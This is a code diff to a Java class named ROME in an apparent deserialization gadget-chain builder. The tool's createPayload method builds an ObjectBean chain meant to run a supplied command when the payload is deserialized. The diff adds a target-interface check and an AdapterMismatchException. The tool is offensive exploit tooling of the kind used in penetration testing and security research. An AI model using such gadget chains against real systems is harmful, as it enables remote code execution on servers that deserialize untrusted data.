@@ -8,6 +8,8 @@ import org.ses.gadgetbuilder.annotations.Impact;
 import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
 import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
 import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
+import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
+
 import javax.xml.transform.Templates;
 import java.lang.reflect.Method;
 
@@ -23,7 +25,14 @@ public class ROME extends MethodInvokeGadgetChain<HashCodeTrampoline, GetterMeth
     protected TrampolineConnector createPayload(String command) throws Exception {
         Object o = this.methodInvokeAdapter.getInvocationTarget(command);
 
-        ObjectBean delegate = new ObjectBean(o.getClass(), o);
+        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();
+
+        if (targetInterface == null) {
+            throw new AdapterMismatchException("Spring gadget chain requires a sink method adapter class that has interfaces " +
+                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
+        }
+
+        ObjectBean delegate = new ObjectBean(targetInterface, o);
         ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
 
         return new TrampolineConnector(root);
